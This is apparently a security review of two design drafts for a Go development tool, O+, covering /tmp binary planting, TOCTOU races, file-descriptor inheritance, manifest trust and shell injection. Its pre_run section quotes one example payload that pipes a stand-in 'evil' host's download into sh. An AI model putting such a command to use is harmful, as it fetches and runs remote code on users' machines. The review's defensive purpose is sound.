# Security Review — O+ War Room, Round 2

**Persona:** Paranoid Security Reviewer
**Bias:** Input is malicious, deploy env hostile. Nitpick auth/injection/secrets/trust boundaries ONLY. Ignore style.
**Date:** 2026-08-25

---

## Draft A: "Boring Bazaar" (Staff Architect)

**Verdict: APPROVE-WITH-CONDITIONS**

The Architect understands the threat model and explicitly names four risks (A–D) with mitigations. This is far better than silence. However, the mitigations for two named attack vectors are incomplete, and one unmentioned attack vector is concrete.

---

### Attack 1 (MEDIUM): `/tmp` Binary Planting — TOCTOU [UNMITIGATED]

**Location:** §2b, line 81 — `go build -o /tmp/o+run-XXXX`

The compiled binary is written to `/tmp` with a placeholder name (`XXXX`). On standard Linux, `/tmp` is world-readable and world-writable. The sequence is:

1. O+ builds new binary to `/tmp/o+run-XXXX`
2. O+ kills old process
3. O+ reads the binary path and execs it

A local attacker (another user on the same machine, or a compromised container sidecar) monitors `/tmp` for files matching the pattern, and between steps 2–3 replaces the binary with a trojan. The Architect acknowledges a similar TOCTOU risk for the build cache (Risk D, §7) but does not apply the same reasoning to the primary exec path.

**The Architect's supposed mitigation** — "verify hash again immediately before exec" (Risk D, line 263) — is not wired into the per-reload exec path at all. The `o+run` output path has no hash verification before exec.

**Required condition to APPROVE:** One of:
- (a) Build to `$XDG_RUNTIME_DIR/o+/` or `os.UserCacheDir()` — per-user, mode 0700 by default — not `/tmp`.
- (b) OR: verify `sha256` of the binary against a known-good value immediately before calling `syscall.Exec` / `os.StartProcess`, with the verification done on the same `os.File` descriptor that will be passed to exec (eliminating the TOCTOU window).
- (c) OR: use `memfd_create` (Linux ≥3.17) to write the binary to an anonymous memory fd that no other process can see, then exec from `/proc/self/fd/N`.

---

### Attack 2 (MEDIUM): `pre_run` Hook Shell Injection [PARTIALLY MITIGATED]

**Location:** §5, line 191 — `pre_run: []` and §7 Risk A, lines 242–246

The manifest allows `pre_run` as a list of commands. The Architect correctly identifies that a malicious `o+.yaml` can execute arbitrary code via `pre_run`. The trust-model mitigation (`--trust` flag + sha256 fingerprint) is reasonable.

**However**, the draft does not specify *how* `pre_run` entries are executed. If the implementation uses `sh -c "<entry>"` (shell invocation), every entry is a full command injection vector: shell metacharacters, variable expansion, command substitution all apply. A `pre_run` entry of `"; curl http://evil/payload | sh"` becomes trivial. If the implementation uses `exec.Command(entry[0], entry[1:]...)` (direct exec, no shell), the attack surface is limited to the path/binary named in the first element.

**Required condition to APPROVE:** Explicitly document in the manifest spec that `pre_run` entries are exec'd directly via `os/exec` (no shell interpreter) or, if shell is required (e.g. for pipes/redirects), that each entry is validated against a whitelist of safe patterns before execution. The trust model alone is insufficient if the execution model includes a shell.

---

### Attack 3 (LOW): Unclosed Inheritable File Descriptors [UNMITIGATED]

**Location:** §2b, lines 79–83 (exec sequence), §7 Risk A

The Architect describes the exec sequence in detail but does not mention closing file descriptors before exec. By default in Go, `os.StartProcess` / `os/exec.Cmd` passes **all inheritable FDs** to the child process — including the inotify fd from fsnotify, any open log files, any network connections O+ holds. A malicious child process can:

- Read from the inotify fd to observe which files O+ is watching (intelligence gathering).
- Write to an inherited log or socket (privilege escalation via O+'s identity).
- Hold FDs open to prevent proper shutdown.

The fix is well-documented Go practice: set `Cmd.SysProcAttr.NoInheritHandles` (Windows) or use `syscall.CloseOnExec` on all non-std FDs, or set `Files` to explicitly list only FDs 0,1,2 before exec. The Architect should specify this.

**Condition:** Document FD cleanup before exec in the runner module.

---

### Attack 4 (LOW): Build Cache Hash TOCTOU [ACKNOWLEDGED, PARTIALLY MITIGATED]

**Location:** §7 Risk D, lines 261–263

The Architect acknowledges this: shared `~/.cache/o+/` can have a poisoned artifact replaced between hash verification and exec. The proposed mitigation ("verify hash again immediately before exec") is stated as intent but not designed in detail. The hash verification must operate on the **same file handle** that will be exec'd — if O+ opens the file, verifies, closes it, then execs by path, the window exists. Exec by fd is the only correct fix.

**Condition:** Either exec via `/proc/self/fd/N` on Linux, or document that hash verification is done on the memory-mapped binary before exec.

---

### Additional Observations (not blocking approval)

- **Anchor/alias YAML bombs (§5, line 203):** Good call disabling them. Confirm implementation uses `yaml.v3` `KnownFields(true)` + a custom `Decoder` with anchor check, or just the library's default behavior.
- **1MB manifest limit (§5, line 204):** Good. Also set a `io.LimitReader` on the decoder input, not just a post-parse size check — prevents memory allocation during parse.
- **No env var interpolation (§5, line 202):** Good. Prevents a class of injection.
- **CPU timeout on YAML decode (§5, line 250, implied 100ms):** Requires runtime CPU budget tracking which is non-trivial in Go. Consider just a parsing-depth limit + input size limit instead — they're simpler and harder to bypass.

---

## Draft B: "Ship It" (Pragmatic Builder)

**Verdict: REJECT**

The Builder draft is thinner, which inherently means a smaller attack surface, but it fails to name or mitigate the attack vectors that do exist. Several concrete, named attack vectors are present with zero mitigation.

---

### Attack 1 (HIGH): Predictable `/tmp` Binary Path — No Integrity Verification [UNMITIGATED]

**Location:** § `o+ run`, line 32 — `go build -o /tmp/o+-cache-<hash> .`

The Builder uses a deterministic `<hash>` for the output path (presumably derived from project source). This means the path `/tmp/o+-cache-<hash>` is **predictable**. A local attacker can:

1. Compute the same hash from the victim's source.
2. Pre-place a trojan binary at `/tmp/o+-cache-<hash>`.
3. Wait for the victim to run `o+ run`.
4. O+ calls `go build` — which succeeds, but O+ does not check whether the built binary is the one it wrote vs. the pre-placed one (no hash comparison, no mtime check, no fd-based exec).
5. O+ execs the trojan.

Even without pre-placement, a race-condition window exists between `go build` completion and exec — on a busy multi-user system this window can be exploited by inotify-watching `/tmp` for the file creation. The Builder mentions zero integrity verification for the cached binary or the exec path.

**This is a REJECT-level finding because:**
- The binary path is deterministic (or predictable by hash).
- No hash verification of the built artifact before exec.
- No fd-based exec to eliminate the TOCTOU window.
- `/tmp` is the default temp directory on every Linux distribution.

---

### Attack 2 (HIGH): No Trust Boundary for Manifest or Build Config [UNMITIGATED]

**Location:** §§ `o+ run`, `o+ build`, `o+ test` — entire draft

The Builder draft has no trust model at all for the manifest (`o+.json`). The Architect's draft has `--trust` + fingerprint; the Builder's has nothing. An attacker who controls a repository can:

- Set `run.build_args` to inject arbitrary `go build` flags (e.g., `-a` to disable cache and slow builds, or `-ldflags` to introduce build-time code injection via `-X`).
- Set `run.watch_extensions` or `run.ignore_dirs` to avoid detection of malicious files.
- There is no `pre_run` hook in the Builder's manifest schema, which is actually *better* for security (one fewer vector) — but the lack of any trust means a manifest can configure O+ behavior without the user's awareness.

While the Builder avoids `pre_run` hooks (good), the remaining manifest-controlled behaviors (build flags, watch paths, ignore dirs) still affect the user's system with no audit trail or consent check.

---

### Attack 3 (MEDIUM): `o+ new --force --force` System Directory Overwrite [PARTIALLY ACKNOWLEDGED]

**Location:** § Risks, lines 126–127

The Builder correctly identifies this risk and proposes a mitigation: reject targets outside `$HOME` or `/tmp` unless `--force` is passed **twice**. However:

- The draft does not commit to implementing this check. It's listed as a risk, not a requirement.
- Even with the double-`--force` guard, the behavior of `os.RemoveAll` followed by `os.Copy` on a system directory is catastrophic. A single user mistake (alias, muscle memory) destroys the system.
- The draft says "validate the target is either empty or doesn't exist before writing" — but if the target doesn't exist, there's nothing to destroy; the danger is when the target *does* exist and contains system files. The validation seems mis-specified.

**The Builder must either:**
1. Make the destructive path check a hard requirement (not a risk note), with clear code-level implementation in the PR.
2. Never use `os.RemoveAll` on the target path; instead, error if target exists and is non-empty, unless `--force` is passed, and *only* then remove contents.

---

### Attack 4 (LOW): No Signal Handler / FD / Environment Sanitization Before Exec [ACKNOWLEDGED BUT NOT COMMITTED]

**Location:** § Risks, line 124

The Builder lists "the child process inherits O+'s signal handlers, environment, and file descriptors" as a risk, and proposes mitigations ("Set `SysProcAttr` with separate process group, clear sensitive env vars before exec, run child in a new PID namespace"). However:

- This is written as a risk, not a specification. Nothing in the Builder's code outline commits to implementing these protections.
- PID namespace for the child is marked "where available" — this is Linux-only, which is fine for v0.1, but the fallback behavior for macOS (v0.2 target) is unspecified.
- Clearing sensitive env vars: which vars? Does O+ have secrets? If not, this is noise. But O+ may read credentials from the environment for proxy auth, etc. The specification should name the vars that are stripped (e.g., any `O+_*` vars, or `GOPRIVATE` tokens).

**Required condition for reconsideration:** The Builder must convert these risk notes into implementation requirements, specifically:
- `Cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}` (process group isolation)
- Explicitly close non-std FDs or pass only FDs 0,1,2 in `Cmd.ExtraFiles`
- Define an env allowlist or denylist that is stripped before exec

---

### Attack 5 (LOW): `.o+ignore` File — No Path Validation [UNMITIGATED]

**Location:** § `o+ run`, line 38

The `.o+ignore` file (analogous to `.gitignore`) controls which directories are excluded from the file watcher. If the format supports arbitrary glob patterns, an attacker who can write `.o+ignore` can:

- Exclude malicious files from being watched (so editing them doesn't trigger a rebuild, hiding changes).
- Use path traversal in ignore patterns to suppress watch on system directories (less relevant, but inconsistent).

This is low severity because the attacker already needs write access to the project directory, but it's an unvalidated configuration input that affects security-relevant behavior (which files trigger code execution).

---

### Summary Comparison

| Vector | Architect | Builder |
|--------|-----------|---------|
| `/tmp` binary planting | Unmitigated (CONDITION) | Unmitigated (REJECT) |
| `pre_run` execution | Partial mitigation (CONDITION) | N/A (no pre_run — good) |
| FD inheritance | Unmitigated (CONDITION) | Acknowledged, not committed |
| Cache hash TOCTOU | Partial mitigation (CONDITION) | No cache at all (fresh build each time, but TOCTOU between build and exec) |
| Trust boundary / fingerprint | Present (--trust + hash) | None |
| YAML bomb protections | Multi-layered | N/A (JSON — less bomb-prone) |
| System dir overwrite | N/A (no `o+ new --force` mentioned) | Acknowledged but not committed |

---

## Requirements

### Architect: APPROVE-WITH-CONDITIONS

Must resolve before v0.1 ships:
1. **`/tmp` binary path** — use per-user temp dir (<0700) or fd-based exec. (Attack 1)
2. **`pre_run` execution model** — document no-shell-exec or add shell-injection validation + whitelist. (Attack 2)
3. **FD cleanup before exec** — document and implement `CloseOnExec` or explicit FD list. (Attack 3)

### Builder: REJECT

Must resolve before v0.1 ships:
1. **Predictable `/tmp` binary path with no integrity check** — fix with per-user temp dir + hash verification or fd-based exec. (Attack 1)
2. **No trust boundary on manifest** — implement a trust model (fingerprint + confirmation) before allowing manifest-driven behavior changes. (Attack 2)
3. **`o+ new` destructive path** — hard-code the path-safety check as implementation, not aspiration. (Attack 3)
4. **Signal/FD/env sanitization** — convert acknowledged risks into committed implementation. (Attack 4)

After fixing these, the Builder draft should be re-reviewed. The simplicity of the Builder's design is appealing, but it carries the same fundamental `/tmp` TOCTOU as the Architect's draft plus a missing trust boundary that the Architect does address.